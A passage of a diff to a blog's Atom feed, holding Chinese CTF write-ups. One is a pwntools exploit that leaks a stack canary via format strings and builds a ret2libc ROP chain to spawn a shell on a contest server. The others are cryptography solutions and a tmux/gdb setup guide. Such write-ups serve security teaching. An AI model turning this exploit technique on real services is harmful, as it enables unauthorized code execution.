_pyx_f_3app_get_info 函数的地址，就能去计算这个库程序的基地址了，先泄 canary，后面就是 ret2libc 来 getshell 了image比较特别的点就是 __printf_chk 函数相较于普通的 printf 函数，不能使用 <span class="token operator">%</span>N$ 的形式泄数据，然后格式化字符串的偏移是<span class="token number">5</span>（刚开始发现在上图中第一个 read 处直接敲个回车或者发送刚好 <span class="token number">0x100</span> 字节的数据过去之后都能泄点栈数据出来，比赛做这道题时琢磨了挺久这些数据能怎么用，因为当时没配通本地运行环境，也不知道泄出的是什么数据，然后后面倒是没用上这些数据赛后折腾了下运行环境，要和他生成 <span class="token punctuation">.</span>so 用的 python3<span class="token number">.7</span> 版本一样才能运行，这样添加一下 syspath 就能直接 <span class="token keyword">import</span> app 了，在脚本中连gdb调试的话是这样写gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'main.py'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>断点断在 PyImport_ImportModule<span class="token operator">+</span><span class="token number">4</span>，然后一直往下运行看看那个包导入了 <span class="token punctuation">.</span>soexp 如下<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.201.35.76'</span><span class="token punctuation">,</span> <span class="token number">20611</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>s <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>get_info_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"get_info_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>get_info_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_info_addr <span class="token operator">-</span> <span class="token number">0x68B0</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 5+(0x118-0x10)/0x8</span>payload <span class="token operator">=</span> <span class="token string">'%p'</span><span class="token operator">*</span><span class="token number">37</span> <span class="token operator">+</span> <span class="token string">'flag'</span> <span class="token operator">+</span> <span class="token string">'%p'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>leak_canary <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>leak_canary <span class="token operator">=</span> int<span class="token punctuation">(</span>leak_canary<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'leak_canary: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak_canary<span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3f8f</span>pop_rsi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3cd9</span>main <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x99F0</span>puts_plt <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3710</span>puts_got <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x16078</span>payload <span class="token operator">=</span>  <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leak_canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_base2 <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc_base2: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base2<span class="token punctuation">)</span><span class="token punctuation">)</span>binsh <span class="token operator">=</span> libc_base2 <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base2 <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x9A93</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leak_canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="strange-hash"><a href="#strange-hash" class="headerlink" title="strange_hash"></a>strange_hash</h3><p>注意到没验证num tuple长度，直接求逆问题然后在得到的三元组后加一位0就行。</p><pre class=" language-python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">18446744073709551557</span>M <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">280</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">18446744073709551543</span><span class="token punctuation">,</span> <span class="token number">18446744073709551467</span><span class="token punctuation">,</span> <span class="token number">18446744073709551123</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">]</span><span class="token punctuation">]</span>ConInv <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x39a3f978106bac2d</span><span class="token punctuation">,</span><span class="token number">0x2940e055f4a33725</span><span class="token punctuation">,</span><span class="token number">0xfda9a7a293fb5bc9</span><span class="token punctuation">]</span>Con <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0x9c52c2de7a9373c4</span><span class="token punctuation">,</span><span class="token number">0xf2135cb886d0fa21</span><span class="token punctuation">,</span><span class="token number">0x957df7f3cd4879e9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0xd54f837d2738d717</span><span class="token punctuation">,</span><span class="token number">0x400ddf1ffaae436d</span><span class="token punctuation">,</span><span class="token number">0xc2abb601d9a26b07</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x1904359f1deb3495</span><span class="token punctuation">,</span><span class="token number">0xc21aa09ba52b157b</span><span class="token punctuation">,</span><span class="token number">0x3d45525db1b19a0c</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0xed66cf26a65afc73</span><span class="token punctuation">,</span><span class="token number">0x1cee569b29ffa476</span><span class="token punctuation">,</span><span class="token number">0x3da45abf4304849</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x1c1a642fa0f3d96d</span><span class="token punctuation">,</span><span class="token number">0x59a1c4fbb96aec86</span><span class="token punctuation">,</span><span class="token number">0xa18e9ca93163f63d</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x9621ec9fbcb402be</span><span class="token punctuation">,</span><span class="token number">0xd69468353c31bee0</span><span class="token punctuation">,</span><span class="token number">0x50655b3f20fee3b8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x109cde7a61c2c195</span><span class="token punctuation">,</span><span class="token number">0x5ebbd9e98be60c59</span><span class="token punctuation">,</span><span class="token number">0x334d2d15f6e43190</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x47af2b0d63901977</span><span class="token punctuation">,</span><span class="token number">0x67ace097bf8c6f34</span><span class="token punctuation">,</span><span class="token number">0xb87da3296b70d64b</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x52d6344b38f49899</span><span class="token punctuation">,</span><span class="token number">0xad5773add31420e1</span><span class="token punctuation">,</span><span class="token number">0xecd0b7480f8c8095</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0xe2afb6d20f5decda</span><span class="token punctuation">,</span><span class="token number">0xb1767d8be7d1371</span><span class="token punctuation">,</span><span class="token number">0x902fd6806a0ef4db</span><span class="token punctuation">]</span><span class="token punctuation">]</span>M <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> M<span class="token punctuation">)</span>u <span class="token operator">=</span> vector<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>phi <span class="token operator">=</span> M<span class="token punctuation">.</span>multiplicative_order<span class="token punctuation">(</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mypow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>i<span class="token punctuation">,</span> a<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span>c3 <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> Con<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> Con<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> Con<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>c0 <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> Con<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ni <span class="token operator">=</span> M<span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>u <span class="token operator">=</span> mypow<span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token operator">-</span>c3<span class="token punctuation">)</span><span class="token operator">*</span>ni<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>u <span class="token operator">=</span> mypow<span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token operator">-</span>c2<span class="token punctuation">)</span><span class="token operator">*</span>ni<span class="token punctuation">,</span> d<span class="token punctuation">)</span>u <span class="token operator">=</span> mypow<span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token operator">-</span>c1<span class="token punctuation">)</span><span class="token operator">*</span>ni<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>u <span class="token operator">=</span> mypow<span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token operator">-</span>c0<span class="token punctuation">)</span><span class="token operator">*</span>ni<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token operator">-</span>vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> ConInv<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''(5329202944861711021, 10075872277090249537, 6598944197421011167,0 )'''</span></code></pre><h3 id="lift"><a href="#lift" class="headerlink" title="lift"></a>lift</h3><p>ged-251=0 mod p^4，coppersmith取beta=4/6，epsilon=0.03求解d mod p^4，利用ed-1和n做gcd分解n，最后有限域开根做lift即可</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> irootn <span class="token operator">=</span> <span class="token number">108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077</span>e <span class="token operator">=</span> <span class="token number">3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039</span>c <span class="token operator">=</span> <span class="token number">72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> e<span class="token operator">*</span>x<span class="token number">-251</span>f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>d <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">256</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.63</span><span class="token punctuation">,</span> epsilon<span class="token operator">=</span><span class="token number">0.03</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>p <span class="token operator">=</span> iroot<span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token number">-251</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>q <span class="token operator">=</span> n<span class="token operator">//</span>p<span class="token operator">^</span><span class="token number">5</span><span class="token keyword">assert</span> n <span class="token operator">==</span> p<span class="token operator">^</span><span class="token number">5</span><span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span>p<span class="token operator">^</span><span class="token number">4</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e<span class="token operator">//</span><span class="token number">251</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>cm <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>F1 <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>p<span class="token operator">^</span><span class="token number">3</span><span class="token punctuation">)</span>F2 <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>q<span class="token punctuation">)</span>root1 <span class="token operator">=</span> F1<span class="token punctuation">(</span>cm<span class="token punctuation">)</span><span class="token punctuation">.</span>nth_root<span class="token punctuation">(</span><span class="token number">251</span><span class="token punctuation">,</span> all<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>root2 <span class="token operator">=</span> F2<span class="token punctuation">(</span>cm<span class="token punctuation">)</span><span class="token punctuation">.</span>nth_root<span class="token punctuation">(</span><span class="token number">251</span><span class="token punctuation">,</span> all<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> root1<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> root2<span class="token punctuation">:</span>        m <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>crt<span class="token punctuation">(</span><span class="token punctuation">[</span>ZZ<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> ZZ<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token operator">^</span><span class="token number">3</span><span class="token punctuation">,</span> q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> m<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">512</span><span class="token punctuation">:</span>            m <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre>]]></content>
     
@@ -111,19 +137,19 @@
     
     
     
-    <category term="HASHTEAM&#39;wp" scheme="http://lmarch2.github.io/categories/HASHTEAM-wp/"/>
+    <category term="HASHTEAM&#39;wp" scheme="http://lmarch2.top/categories/HASHTEAM-wp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="杯子" scheme="http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"/>
+    <category term="杯子" scheme="http://lmarch2.top/tags/%E6%9D%AF%E5%AD%90/"/>
     
   </entry>
   
   <entry>
     <title>DASCTF X CBCTF 2023 WP</title>
-    <link href="http://lmarch2.github.io/posts/ec1aa757/"/>
-    <id>http://lmarch2.github.io/posts/ec1aa757/</id>
+    <link href="http://lmarch2.top/posts/ec1aa757/"/>
+    <id>http://lmarch2.top/posts/ec1aa757/</id>
     <published>2023-10-27T12:56:45.000Z</published>
     <updated>2024-02-05T14:24:28.244Z</updated>
     
@@ -137,19 +163,19 @@
     
     
     
-    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
+    <category term="wp" scheme="http://lmarch2.top/categories/wp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="DASCTF" scheme="http://lmarch2.github.io/tags/DASCTF/"/>
+    <category term="DASCTF" scheme="http://lmarch2.top/tags/DASCTF/"/>
     
   </entry>
   
   <entry>
     <title>NSSCTF 2nd wp</title>
-    <link href="http://lmarch2.github.io/posts/4b18615c/"/>
-    <id>http://lmarch2.github.io/posts/4b18615c/</id>
+    <link href="http://lmarch2.top/posts/4b18615c/"/>
+    <id>http://lmarch2.top/posts/4b18615c/</id>
     <published>2023-08-29T16:31:50.000Z</published>
     <updated>2024-02-06T13:35:31.161Z</updated>
     
@@ -163,23 +189,23 @@
     
     
     
-    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
+    <category term="wp" scheme="http://lmarch2.top/categories/wp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="NSSCTF" scheme="http://lmarch2.github.io/tags/NSSCTF/"/>
+    <category term="NSSCTF" scheme="http://lmarch2.top/tags/NSSCTF/"/>
     
   </entry>
   
   <entry>
     <title>WSL2下不能使用gdb.attach的解决方案</title>
-    <link href="http://lmarch2.github.io/posts/19b7c9d1/"/>
-    <id>http://lmarch2.github.io/posts/19b7c9d1/</id>
+    <link href="http://lmarch2.top/posts/19b7c9d1/"/>
+    <id>http://lmarch2.top/posts/19b7c9d1/</id>
     <published>2023-08-29T12:53:24.000Z</published>
-    <updated>2024-02-04T06:46:48.950Z</updated>
+    <updated>2024-02-08T12:00:36.606Z</updated>
     
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>pwndbg在WSL下一直没法使用下断点调试的功能，找了半天发现tmux可以帮助解决这个问题</p><h2 id="安装tmux"><a href="#安装tmux" class="headerlink" title="安装tmux"></a>安装tmux</h2><p>用root权限安装</p><blockquote><p>sudo apt-get install tmux</p></blockquote><p>进入根目录</p><blockquote><p>cd ~</p></blockquote><h2 id="编辑配置"><a href="#编辑配置" class="headerlink" title="编辑配置"></a>编辑配置</h2><p>使用root权限打开tmux，方便保存配置文件</p><blockquote><p>sudo tmux</p></blockquote><p>新建.tmux.conf文件</p><blockquote><p>vim .tmux.conf</p></blockquote><p>在文件中输入</p><pre><code>#输入bind-key c new-window -c "#{pane_current_path}"bind-key % split-window -h -c "#{pane_current_path}"bind-key '"' split-window -c "#{pane_current_path}"set -g mouse on</code></pre><p>关闭所有tmux窗口并输入</p><blockquote><p>tmux source-file ~/.tmux.conf</p></blockquote><p>重新启动tmux则完成更改、</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>接下来可以在exp中下断点了  <code>gdb.attach(p)</code></p><p>同时要在exp中加上指定terminal</p><blockquote><p>context.terminal = [‘tmux’, ‘splitw’, ‘-h’]</p></blockquote><p>-h代表横向分屏</p><p>之后就可以在运行exp时debug</p><p>注意要在tmux终端下运行</p>]]></content>
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>pwndbg在WSL下一直没法使用下断点调试的功能，找了半天发现tmux可以帮助解决这个问题</p><h2 id="安装tmux"><a href="#安装tmux" class="headerlink" title="安装tmux"></a>安装tmux</h2><p>用root权限安装</p><blockquote><p>sudo apt-get install tmux</p></blockquote><p>进入根目录</p><blockquote><p>cd ~</p></blockquote><h2 id="编辑配置"><a href="#编辑配置" class="headerlink" title="编辑配置"></a>编辑配置</h2><p>使用root权限打开tmux，方便保存配置文件</p><blockquote><p>sudo tmux</p></blockquote><p>新建.tmux.conf文件</p><blockquote><p>vim .tmux.conf</p></blockquote><p>在文件中输入</p><blockquote><p>#输入<br>bind-key c new-window -c “#{pane_current_path}”<br>bind-key % split-window -h -c “#{pane_current_path}”<br>bind-key ‘“‘ split-window -c “#{pane_current_path}”<br>set -g mouse on</p></blockquote><p>关闭所有tmux窗口并输入</p><blockquote><p>tmux source-file ~/.tmux.conf</p></blockquote><p>重新启动tmux则完成更改、</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>接下来可以在exp中下断点了  <code>gdb.attach(p)</code></p><p>同时要在exp中加上指定terminal</p><blockquote><p>context.terminal = [‘tmux’, ‘splitw’, ‘-h’]</p></blockquote><p>-h代表横向分屏</p><p>之后就可以在运行exp时debug</p><p>注意要在tmux终端下运行</p>]]></content>
     
     
       
@@ -189,17 +215,17 @@
     
     
     
-    <category term="tools and tricks" scheme="http://lmarch2.github.io/categories/tools-and-tricks/"/>
+    <category term="tools and tricks" scheme="http://lmarch2.top/categories/tools-and-tricks/"/>
     
     
-    <category term="pwn" scheme="http://lmarch2.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="http://lmarch2.top/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>NSSCTF ROUND#14 wp</title>
-    <link href="http://lmarch2.github.io/posts/fa745d1d/"/>
-    <id>http://lmarch2.github.io/posts/fa745d1d/</id>
+    <link href="http://lmarch2.top/posts/fa745d1d/"/>
+    <id>http://lmarch2.top/posts/fa745d1d/</id>
     <published>2023-08-29T12:46:39.000Z</published>
     <updated>2024-02-04T06:52:26.261Z</updated>
     
@@ -213,19 +239,19 @@
     
     
     
-    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
+    <category term="wp" scheme="http://lmarch2.top/categories/wp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="NSSCTF" scheme="http://lmarch2.github.io/tags/NSSCTF/"/>
+    <category term="NSSCTF" scheme="http://lmarch2.top/tags/NSSCTF/"/>
     
   </entry>
   
   <entry>
     <title>ret2libc3合集</title>
-    <link href="http://lmarch2.github.io/posts/be5100f9/"/>
-    <id>http://lmarch2.github.io/posts/be5100f9/</id>
+    <link href="http://lmarch2.top/posts/be5100f9/"/>
+    <id>http://lmarch2.top/posts/be5100f9/</id>
     <published>2023-08-29T12:45:22.000Z</published>
     <updated>2024-02-04T06:46:34.792Z</updated>
     
@@ -239,17 +265,17 @@
     
     
     
-    <category term="collections" scheme="http://lmarch2.github.io/categories/collections/"/>
+    <category term="collections" scheme="http://lmarch2.top/categories/collections/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
   </entry>
   
   <entry>
     <title>C++STL 学习笔记</title>
-    <link href="http://lmarch2.github.io/posts/45592537/"/>
-    <id>http://lmarch2.github.io/posts/45592537/</id>
+    <link href="http://lmarch2.top/posts/45592537/"/>
+    <id>http://lmarch2.top/posts/45592537/</id>
     <published>2023-08-29T12:37:51.000Z</published>
     <updated>2024-02-04T06:46:12.338Z</updated>
     
@@ -263,17 +289,17 @@
     
     
     
-    <category term="notes" scheme="http://lmarch2.github.io/categories/notes/"/>
+    <category term="notes" scheme="http://lmarch2.top/categories/notes/"/>
     
     
-    <category term="C++" scheme="http://lmarch2.github.io/tags/C/"/>
+    <category term="C++" scheme="http://lmarch2.top/tags/C/"/>
     
   </entry>
   
   <entry>
     <title>远古BUUCTF的wp</title>
-    <link href="http://lmarch2.github.io/posts/de339b6d/"/>
-    <id>http://lmarch2.github.io/posts/de339b6d/</id>
+    <link href="http://lmarch2.top/posts/de339b6d/"/>
+    <id>http://lmarch2.top/posts/de339b6d/</id>
